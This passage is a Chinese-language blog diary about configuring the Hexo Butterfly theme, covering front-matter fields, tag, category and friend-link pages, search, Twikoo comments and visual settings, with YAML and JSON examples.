<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Don&#x27;t modify the following settings unless you know how they work (非必要請不要修改 )</span></span><br><span class="line"><span class="comment"># Choose: readmode,translate,darkmode,hideAside,toc,chat,comment</span></span><br><span class="line"><span class="comment"># Don&#x27;t repeat 不要重複</span></span><br><span class="line"><span class="attr">rightside_item_order:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">hide:</span> <span class="comment"># readmode,translate,darkmode,hideAside</span></span><br><span class="line">  <span class="attr">show:</span> <span class="comment"># toc,chat,comment</span></span><br></pre></td></tr></table></figure>
<h2 id="17-标签外挂"><a href="#17-标签外挂" class="headerlink" title="17. 标签外挂"></a>17. 标签外挂</h2><p>换了标签外挂plus 。放在inject上面了，也没啥用 到时候看看好了</p>
<h2 id="18-文章和页面"><a href="#18-文章和页面" class="headerlink" title="18. 文章和页面"></a>18. 文章和页面</h2><blockquote>
<p>[!IMPORTANT]</p>
<p>关于front-matter </p>
<p>是markdown文件最上方以—-分隔的区域，用于指定个别档案的变数</p>
<p>Page Front-matter 用于页面配置</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>写法</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td>title</td>
<td>【必需】頁面標題</td>
</tr>
<tr>
<td>date</td>
<td>【必需】頁面創建日期</td>
</tr>
<tr>
<td>type</td>
<td>【必需】標籤、分類和友情鏈接三個頁面需要配置</td>
</tr>
<tr>
<td>updated</td>
<td>【可選】頁面更新日期</td>
</tr>
<tr>
<td>description</td>
<td>【可選】頁面描述</td>
</tr>
<tr>
<td>keywords</td>
<td>【可選】頁面關鍵字</td>
</tr>
<tr>
<td>comments</td>
<td>【可選】顯示頁面評論模塊 (默認 true)</td>
</tr>
<tr>
<td>top_img</td>
<td>【可選】頁面頂部圖片</td>
</tr>
<tr>
<td>mathjax</td>
<td>【可選】顯示mathjax (當設置mathjax的per_page: false時，才需要配置，默認 false)</td>
</tr>
<tr>
<td>katex</td>
<td>【可選】顯示katex (當設置katex的per_page: false時，才需要配置，默認 false)</td>
</tr>
<tr>
<td>aside</td>
<td>【可選】顯示側邊欄 (默認 true)</td>
</tr>
<tr>
<td>aplayer</td>
<td>【可選】在需要的頁面加載aplayer的js和css,請參考文章下面的音樂 配置</td>
</tr>
<tr>
<td>highlight_shrink</td>
<td>【可選】配置代碼框是否展開 (true/false) (默認為設置中highlight_shrink的配置)</td>
</tr>
<tr>
<td>random</td>
<td>【可選】配置友情鏈接是否隨機排序（默認為 false)</td>
</tr>
</tbody>
</table>
</div>
</blockquote>
<p>Post Front-matter 用於文章頁配置</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>寫法</th>
<th>解釋</th>
</tr>
</thead>
<tbody>
<tr>
<td>title</td>
<td>【必需】文章標題</td>
</tr>
<tr>
<td>date</td>
<td>【必需】文章創建日期</td>
</tr>
<tr>
<td>updated</td>
<td>【可選】文章更新日期</td>
</tr>
<tr>
<td>tags</td>
<td>【可選】文章標籤</td>
</tr>
<tr>
<td>categories</td>
<td>【可選】文章分類</td>
</tr>
<tr>
<td>keywords</td>
<td>【可選】文章關鍵字</td>
</tr>
<tr>
<td>description</td>
<td>【可選】文章描述</td>
</tr>
<tr>
<td>top_img</td>
<td>【可選】文章頂部圖片</td>
</tr>
<tr>
<td>cover</td>
<td>【可選】文章縮略圖(如果沒有設置top_img,文章頁頂部將顯示縮略圖，可設為false/圖片地址/留空)</td>
</tr>
<tr>
<td>comments</td>
<td>【可選】顯示文章評論模塊(默認 true)</td>
</tr>
<tr>
<td>toc</td>
<td>【可選】顯示文章TOC(默認為設置中toc的enable配置)</td>
</tr>
<tr>
<td>toc_number</td>
<td>【可選】顯示toc_number(默認為設置中toc的number配置)</td>
</tr>
<tr>
<td>toc_style_simple</td>
<td>【可選】顯示 toc 簡潔模式</td>
</tr>
<tr>
<td>copyright</td>
<td>【可選】顯示文章版權模塊(默認為設置中post_copyright的enable配置)</td>
</tr>
<tr>
<td>copyright_author</td>
<td>【可選】文章版權模塊的文章作者</td>
</tr>
<tr>
<td>copyright_author_href</td>
<td>【可選】文章版權模塊的文章作者鏈接</td>
</tr>
<tr>
<td>copyright_url</td>
<td>【可選】文章版權模塊的文章連結鏈接</td>
</tr>
<tr>
<td>copyright_info</td>
<td>【可選】文章版權模塊的版權聲明文字</td>
</tr>
<tr>
<td>mathjax</td>
<td>【可選】顯示mathjax(當設置 mathjax 的 per_page: false 時，才需要配置，默認 false )</td>
</tr>
<tr>
<td>katex</td>
<td>【可選】顯示 katex (當設置 katex 的 per_page: false 時，才需要配置，默認 false )</td>
</tr>
<tr>
<td>aplayer</td>
<td>【可選】在需要的頁面加載 aplayer 的 js 和 css,請參考文章下面的音樂 配置</td>
</tr>
<tr>
<td>highlight_shrink</td>
<td>【可選】配置代碼框是否展開(true/false)(默認為設置中 highlight_shrink 的配置)</td>
</tr>
<tr>
<td>aside</td>
<td>【可選】顯示側邊欄 (默認 true)</td>
</tr>
<tr>
<td>abcjs</td>
<td>【可選】加載 abcjs (當設置 abcjs 的 per_page: false 時，才需要配置，默認 false )</td>
</tr>
</tbody>
</table>
</div>
<p>Page：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">updated:</span><br><span class="line">type:</span><br><span class="line">comments:</span><br><span class="line">description:</span><br><span class="line">keywords:</span><br><span class="line">top_img:</span><br><span class="line">mathjax:</span><br><span class="line">katex:</span><br><span class="line">aside:</span><br><span class="line">aplayer:</span><br><span class="line">highlight_shrink:</span><br><span class="line">random:</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>Post：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">updated:</span><br><span class="line">tags:</span><br><span class="line">categories:</span><br><span class="line">keywords:</span><br><span class="line">description:</span><br><span class="line">top_img:</span><br><span class="line">comments:</span><br><span class="line">cover:</span><br><span class="line">toc:</span><br><span class="line">toc_number:</span><br><span class="line">toc_style_simple:</span><br><span class="line">copyright:</span><br><span class="line">copyright_author:</span><br><span class="line">copyright_author_href:</span><br><span class="line">copyright_url:</span><br><span class="line">copyright_info:</span><br><span class="line">mathjax:</span><br><span class="line">katex:</span><br><span class="line">aplayer:</span><br><span class="line">highlight_shrink:</span><br><span class="line">aside:</span><br><span class="line">abcjs:</span><br><span class="line">---</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="19-1-标签页"><a href="#19-1-标签页" class="headerlink" title="19.1 标签页"></a>19.1 标签页</h3><p>前往你的 Hexo 博客的根目錄</p>
<p>輸入 hexo new page tags</p>
<p>你會找到 source/tags/index.md 這個文件</p>
<p>修改這個文件：</p>
<p>記得添加 type: “tags”</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">標籤</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2018-01-05 00:00:00</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;tags&quot;</span></span><br><span class="line"><span class="attr">orderby:</span> <span class="string">random</span></span><br><span class="line"><span class="attr">order:</span> <span class="number">1</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>
<h3 id="19-2-分类页"><a href="#19-2-分类页" class="headerlink" title="19.2 分类页"></a>19.2 分类页</h3><p>前往你的 Hexo 博客的根目錄</p>
<p>輸入 hexo new page categories</p>
<p>你會找到 source/categories/index.md 這個文件</p>
<p>修改這個文件：</p>
<p>記得添加 type: “categories”</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">分類</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2018-01-05 00:00:00</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;categories&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>
<h3 id="19-3-友情链接"><a href="#19-3-友情链接" class="headerlink" title="19.3. 友情链接"></a>19.3. 友情链接</h3><p>前往你的 Hexo 博客的根目錄</p>
<p>輸入 hexo new page link</p>
<p>你會找到 source/link/index.md 這個文件</p>
<p>修改這個文件：</p>
<p>記得添加 type: “link”</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">友情鏈接</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2018-06-07 22:17:49</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;link&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>[!NOTE]</p>
<p>可以选择本地生成or 远程拉取</p>
<p>1.本地生成：</p>
<p>在Hexo博客目錄中的 source/_data（如果沒有 _data 文件夾，請自行創建），創建一個文件 link.yml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">class_name:</span> <span class="string">友情鏈接</span></span><br><span class="line">  <span class="attr">class_desc:</span> <span class="string">那些人，那些事</span></span><br><span class="line">  <span class="attr">link_list:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Hexo</span></span><br><span class="line">      <span class="attr">link:</span> <span class="string">https://hexo.io/zh-tw/</span></span><br><span class="line">      <span class="attr">avatar:</span> <span class="string">https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg</span></span><br><span class="line">      <span class="attr">descr:</span> <span class="string">快速、簡單且強大的網誌框架</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">class_name:</span> <span class="string">網站</span></span><br><span class="line">  <span class="attr">class_desc:</span> <span class="string">值得推薦的網站</span></span><br><span class="line">  <span class="attr">link_list:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Youtube</span></span><br><span class="line">      <span class="attr">link:</span> <span class="string">https://www.youtube.com/</span></span><br><span class="line">      <span class="attr">avatar:</span> <span class="string">https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png</span></span><br><span class="line">      <span class="attr">descr:</span> <span class="string">視頻網站</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Weibo</span></span><br><span class="line">      <span class="attr">link:</span> <span class="string">https://www.weibo.com/</span></span><br><span class="line">      <span class="attr">avatar:</span> <span class="string">https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png</span></span><br><span class="line">      <span class="attr">descr:</span> <span class="string">中國最大社交分享平台</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Twitter</span></span><br><span class="line">      <span class="attr">link:</span> <span class="string">https://twitter.com/</span></span><br><span class="line">      <span class="attr">avatar:</span> <span class="string">https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png</span></span><br><span class="line">      <span class="attr">descr:</span> <span class="string">社交分享平台</span></span><br></pre></td></tr></table></figure>
<p>2.远程拉取：</p>
<p>從 4.0.0 開始，支持從遠程加載友情鏈接，遠程拉取只支持 json。</p>
<p>注意： 選擇遠程加載後，本地生成的方法會無效。</p>
<p>在 source/link/index.md 這個文件的 front-matter 添加遠程鏈接</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">flink_url:</span> <span class="string">xxxxx</span></span><br></pre></td></tr></table></figure>
<p>json格式</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;class_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;友情鏈接&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;class_desc&quot;</span><span class="punctuation">:</span> <span class="string">&quot;那些人，那些事&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;link_list&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hexo&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;link&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://hexo.io/zh-tw/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;descr&quot;</span><span class="punctuation">:</span> <span class="string">&quot;快速、簡單且強大的網誌框架&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;class_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;網站&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;class_desc&quot;</span><span class="punctuation">:</span> <span class="string">&quot;值得推薦的網站&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;link_list&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Youtube&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;link&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.youtube.com/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;descr&quot;</span><span class="punctuation">:</span> <span class="string">&quot;視頻網站&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Weibo&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;link&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.weibo.com/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;descr&quot;</span><span class="punctuation">:</span> <span class="string">&quot;中國最大社交分享平台&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Twitter&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;link&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://twitter.com/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;descr&quot;</span><span class="punctuation">:</span> <span class="string">&quot;社交分享平台&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
</blockquote>
]]></content>
      <tags>
        <tag>日记</tag>
        <tag>butterfly</tag>
        <tag>主题</tag>
      </tags>
  </entry>
  <entry>
    <title>butterfly主题配置日记之二</title>
    <url>/posts/3bb96528.html</url>
    <content><![CDATA[<h1 id="math教学："><a href="#math教学：" class="headerlink" title="math教学："></a>math教学：</h1><p>不知道是什么东西呐，应该用不着。默认就好了</p>
<h1 id="搜索："><a href="#搜索：" class="headerlink" title="搜索："></a>搜索：</h1><p>啊，这个东西浪费了我好长时间，不过搞定了就好QAQ</p>
<ol>
<li><p>你需要安裝 hexo-generator-searchdb 或者 hexo-generator-search，根據它的文檔去做相應配置</p>
</li>
<li><p>修改 主題配置文件</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Preload the search data when the page loads.</span></span><br><span class="line">  <span class="attr">preload:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Show top n results per article, show all results by setting to -1</span></span><br><span class="line">  <span class="attr">top_n_per_article:</span> <span class="number">1</span></span><br><span class="line">  <span class="comment"># Unescape html strings to the readable one.</span></span><br><span class="line">  <span class="attr">unescape:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">CDN:</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="分享："><a href="#分享：" class="headerlink" title="分享："></a>分享：</h1><p>也不需要分享了啦，没弄</p>
<h1 id="评论："><a href="#评论：" class="headerlink" title="评论："></a>评论：</h1><p>这个也弄了挺长时间的，弄得免费的，有钱了再换w</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">comments:</span></span><br><span class="line">  <span class="comment"># Up to two comments system, the first will be shown as default</span></span><br><span class="line">  <span class="comment"># Choose: Disqus/Disqusjs/Livere/Gitalk/Valine/Waline/Utterances/Facebook Comments/Twikoo/Giscus/Remark42/Artalk</span></span><br><span class="line">  <span class="attr">use:</span> <span class="string">Twikoo</span> <span class="comment"># Valine,Disqus</span></span><br><span class="line">  <span class="attr">text:</span> <span class="literal">true</span> <span class="comment"># Display the comment name next to the button</span></span><br><span class="line">  <span class="comment"># lazyload: The comment system will be load when comment element enters the browser&#x27;s viewport.</span></span><br><span class="line">  <span class="comment"># If you set it to true, the comment count will be invalid</span></span><br><span class="line">  <span class="attr">lazyload:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">count:</span> <span class="literal">false</span> <span class="comment"># Display comment count in post&#x27;s top_img</span></span><br><span class="line">  <span class="attr">card_post_count:</span> <span class="literal">false</span> <span class="comment"># Display comment count in Home Page</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="在线聊天"><a href="#在线聊天" class="headerlink" title="在线聊天"></a>在线聊天</h1><p>唔，有评论区就够了~</p>
<h1 id="分析统计"><a href="#分析统计" class="headerlink" title="分析统计"></a>分析统计</h1><p>意义不明</p>
<h1 id="广告"><a href="#广告" class="headerlink" title="广告"></a>广告</h1><p>？ 不打广告</p>
<h1 id="网站认证"><a href="#网站认证" class="headerlink" title="网站认证"></a>网站认证</h1><p>以后变厉害了就弄一弄吧</p>
<h1 id="美化"><a href="#美化" class="headerlink" title="美化"></a>美化</h1><p>来到我们的正题！美化~一个好看的网站才让人有更新的动力，和吸引别人看的兴趣吧·</p>
<h2 id="主题颜色"><a href="#主题颜色" class="headerlink" title="主题颜色"></a>主题颜色</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">theme_color:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">main:</span> <span class="string">&quot;#49B1F5&quot;</span></span><br><span class="line">  <span class="attr">paginator:</span> <span class="string">&quot;#00c4b6&quot;</span></span><br><span class="line">  <span class="attr">button_hover:</span> <span class="string">&quot;#FF7242&quot;</span></span><br><span class="line">  <span class="attr">text_selection:</span> <span class="string">&quot;#00c4b6&quot;</span></span><br><span class="line">  <span class="attr">link_color:</span> <span class="string">&quot;#99a9bf&quot;</span></span><br><span class="line">  <span class="attr">meta_color:</span> <span class="string">&quot;#858585&quot;</span></span><br><span class="line">  <span class="attr">hr_color:</span> <span class="string">&quot;#A4D8FA&quot;</span></span><br><span class="line">  <span class="attr">code_foreground:</span> <span class="string">&quot;#F47466&quot;</span></span><br><span class="line">  <span class="attr">code_background:</span> <span class="string">&quot;rgba(27, 31, 35, .05)&quot;</span></span><br><span class="line">  <span class="attr">toc_color:</span> <span class="string">&quot;#00c4b6&quot;</span></span><br><span class="line">  <span class="attr">blockquote_padding_color:</span> <span class="string">&quot;#49b1f5&quot;</span></span><br><span class="line">  <span class="attr">blockquote_background_color:</span> <span class="string">&quot;#49b1f5&quot;</span></span><br><span class="line">  <span class="attr">scrollbar_color:</span> <span class="string">&quot;#49b1f5&quot;</span></span><br></pre></td></tr></table></figure>
<p>没啥头绪，先不改w</p>
<h2 id="主页top-img显示大小"><a href="#主页top-img显示大小" class="headerlink" title="主页top_img显示大小"></a>主页top_img显示大小</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">index_top_img_height:</span> <span class="string">400px</span></span><br></pre></td></tr></table></figure>
<p>我是一图流来着，这个就不用管了</p>
<h2 id="文字左右对齐"><a href="#文字左右对齐" class="headerlink" title="文字左右对齐"></a>文字左右对齐</h2><p>设置文字向两侧对齐？？？没啥必要吧</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Stretches the lines so that each line has equal width（文字向兩側對齊，對最後一行無效）</span></span><br><span class="line"><span class="attr">text_align_justify:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<h2 id="网站背景"><a href="#网站背景" class="headerlink" title="网站背景"></a>网站背景</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">background:</span> <span class="string">url(https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/4cfb7430f6ee279d.jpg)</span></span><br></pre></td></tr></table></figure>
<p>设置了夸宝的图片，</p>
<h2 id="footer背景"><a href="#footer背景" class="headerlink" title="footer背景"></a>footer背景</h2><p>关掉，嗯，找到合适的图再来设置你</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Footer Background</span></span><br><span class="line"><span class="attr">footer_bg:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<h2 id="打字效果"><a href="#打字效果" class="headerlink" title="打字效果"></a>打字效果</h2><p>搞那么卡干嘛 NG no；</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">activate_power_mode:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">colorful:</span> <span class="literal">true</span> <span class="comment"># open particle animation (冒光特效)</span></span><br><span class="line">  <span class="attr">shake:</span> <span class="literal">true</span> <span class="comment">#  open shake (抖動特效)</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<h2 id="背景特效"><a href="#背景特效" class="headerlink" title="背景特效"></a>背景特效</h2><p>有三种：选canvas-nest</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">canvas_nest:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">color:</span> <span class="string">&#x27;0,0,255&#x27;</span> <span class="comment">#color of lines, default: &#x27;0,0,0&#x27;; RGB values: (R,G,B).(<span class="doctag">note:</span> use &#x27;,&#x27; to separate.)</span></span><br><span class="line">  <span class="attr">opacity:</span> <span class="number">0.7</span> <span class="comment"># the opacity of line (0~1), default: 0.5.</span></span><br><span class="line">  <span class="attr">zIndex:</span> <span class="number">-1</span> <span class="comment"># z-index property of the background, default: -1.</span></span><br><span class="line">  <span class="attr">count:</span> <span class="number">99</span> <span class="comment"># the number of lines, default: 99.</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<h2 id="鼠标点击效果"><a href="#鼠标点击效果" class="headerlink" title="鼠标点击效果"></a>鼠标点击效果</h2><p>我还是找找别的吧！</p>
<h2 id="页面美化"><a href="#页面美化" class="headerlink" title="页面美化"></a>页面美化</h2><p>感觉也没用必要的样子 不开</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Beautify (美化頁面顯示)</span></span><br><span class="line"><span class="attr">beautify:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span> <span class="comment"># site/post</span></span><br><span class="line">  <span class="attr">title-prefix-icon:</span> <span class="comment"># &#x27;\f0c1&#x27;</span></span><br><span class="line">  <span class="attr">title-prefix-icon-color:</span> <span class="comment"># &#x27;#F47466&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="自定义字体"><a href="#自定义字体" class="headerlink" title="自定义字体"></a>自定义字体</h2><p>诶，都可以的啦</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Global font settings</span></span><br><span class="line"><span class="comment"># Don&#x27;t modify the following settings unless you know how they work (非必要不要修改)</span></span><br><span class="line"><span class="attr">font:</span></span><br><span class="line">  <span class="attr">global-font-size:</span></span><br><span class="line">  <span class="attr">code-font-size:</span></span><br><span class="line">  <span class="attr">font-family:</span></span><br><span class="line">  <span class="attr">code-font-family:</span></span><br><span class="line"><span class="comment"># Font settings for the site title and site subtitle</span></span><br><span class="line"><span class="comment"># 左上角網站名字 主頁居中網站名字</span></span><br><span class="line"><span class="attr">blog_title_font:</span></span><br><span class="line">  <span class="attr">font_link:</span></span><br><span class="line">  <span class="attr">font-family:</span></span><br></pre></td></tr></table></figure>
<h2 id="网站副标题"><a href="#网站副标题" class="headerlink" title="网站副标题"></a>网站副标题</h2><p>这个也挺好看的 可以弄一下</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 主頁subtitle</span></span><br><span class="line"><span class="attr">subtitle:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Typewriter Effect (打字效果)</span></span><br><span class="line">  <span class="attr">effect:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">startDelay:</span> <span class="number">300</span> <span class="comment"># time before typing starts in milliseconds</span></span><br><span class="line">  <span class="attr">typeSpeed:</span> <span class="number">150</span> <span class="comment"># type speed in milliseconds</span></span><br><span class="line">  <span class="attr">backSpeed:</span> <span class="number">50</span> <span class="comment"># backspacing speed in milliseconds</span></span><br><span class="line">  <span class="comment"># loop (循環打字)</span></span><br><span class="line">  <span class="attr">loop:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># source 調用第三方服務</span></span><br><span class="line">  <span class="comment"># source: false 關閉調用</span></span><br><span class="line">  <span class="comment"># source: 1  調用一言網的一句話（簡體） https://hitokoto.cn/</span></span><br><span class="line">  <span class="comment"># source: 2  調用一句網（簡體） http://yijuzhan.com/</span></span><br><span class="line">  <span class="comment"># source: 3  調用今日詩詞（簡體） https://www.jinrishici.com/</span></span><br><span class="line">  <span class="comment"># subtitle 會先顯示 source , 再顯示 sub 的內容</span></span><br><span class="line">  <span class="attr">source:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># 如果關閉打字效果，subtitle 只會顯示 sub 的第一行文字</span></span><br><span class="line">  <span class="attr">sub:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">今天也在努力学习中</span> <span class="string">gogogo</span></span><br></pre></td></tr></table></figure>
<h2 id="页面加载动画"><a href="#页面加载动画" class="headerlink" title="页面加载动画"></a>页面加载动画</h2><p>當進入網頁時，因為加載速度的問題，可能會導致 top_img 圖片出現斷層顯示，或者網頁加載不全而出現等待時間，開啟preloader後，會顯示加載動畫，等頁面加載完，加載動畫會消失。</p>
<p>主題支持 pace.js 的加載動畫，具體可查看 pace.js</p>
<p>配置 butterly.yml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 加載動畫 Loading Animation</span></span><br><span class="line"><span class="attr">preloader:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># source</span></span><br><span class="line">  <span class="comment"># 1. fullpage-loading</span></span><br><span class="line">  <span class="comment"># 2. pace (progress bar)</span></span><br><span class="line">  <span class="attr">source:</span> <span class="number">1</span></span><br><span class="line">  <span class="comment"># pace theme (see https://codebyzach.github.io/pace/)</span></span><br><span class="line">  <span class="attr">pace_css_url:</span></span><br></pre></td></tr></table></figure>
<p>先放着</p>
<h1 id="字数统计"><a href="#字数统计" class="headerlink" title="字数统计"></a>字数统计</h1><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># wordcount (字數統計)</span></span><br><span class="line"><span class="comment"># see https://butterfly.js.org/posts/ceeb73f/#字數統計</span></span><br><span class="line"><span class="attr">wordcount:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">post_wordcount:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">min2read:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_wordcount:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h1 id="图片放大查看模式"><a href="#图片放大查看模式" class="headerlink" title="图片放大查看模式"></a>图片放大查看模式</h1><p>不需要</p>
<h1 id="Pjax"><a href="#Pjax" class="headerlink" title="Pjax"></a>Pjax</h1><p>配了吧？ </p>
